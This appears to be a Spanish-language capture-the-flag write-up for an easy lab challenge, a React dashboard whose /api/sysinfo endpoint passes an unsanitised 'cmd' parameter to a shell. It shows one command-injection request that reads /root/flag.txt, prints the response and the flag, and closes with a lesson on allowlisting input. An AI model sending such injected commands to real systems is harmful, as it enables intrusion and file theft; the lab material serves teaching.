# DevOps React Dashboard — Whoami-Labs.COM

**Dificultad:** ★☆☆☆☆☆☆☆ fácil (1 punto)
**Categoría:** Web Exploit / Command Injection
**Plataforma:** Linux (Docker)

---

## Resumen

Dashboard React (BETA) que expone un endpoint interno `/api/sysinfo` con el parámetro `cmd` sin sanitizar, permitiendo inyección de comandos y lectura de la flag root del contenedor.

**Flag:** `ROOT_FLAG{R34CT_RCE_TO_R00T_M4ST3R}`

---

## Análisis del entorno

Aplicación desplegada en `http://172.17.0.2:3000`. La página principal ofrece botones que llaman a `dispatchAction(metricType)` y realizan `GET /api/sysinfo?cmd=<metricType>`.

## Explotación

Se inyecta un comando arbitrario en el parámetro `cmd`:

```
GET /api/sysinfo?cmd=cat%20/root/flag.txt
```

Respuesta:

```json
{"output":"ROOT_FLAG{R34CT_RCE_TO_R00T_M4ST3R}\n"}
```

## Lección

Nunca pasar entrada del usuario directamente a un shell. Usar allowlist de métricas y evitar `exec`/`system` con datos no confiables.
